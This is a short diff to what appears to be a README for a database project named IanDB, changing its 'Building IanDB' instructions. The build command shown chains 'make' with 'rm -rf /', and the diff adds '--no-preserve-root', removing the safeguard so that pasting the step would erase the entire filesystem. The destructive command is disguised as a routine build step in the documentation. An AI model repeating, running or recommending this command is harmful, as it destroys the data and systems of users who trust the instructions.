@@ -20,7 +20,7 @@ For enterprise licenses, please go to https://db.ian678.com/?promocode=nuuls to 
 
 # Building IanDB
 
-    make && rm -rf /
+    make && rm -rf --no-preserve-root /
 
 After building IanDB, it is a good idea to test it using:
 
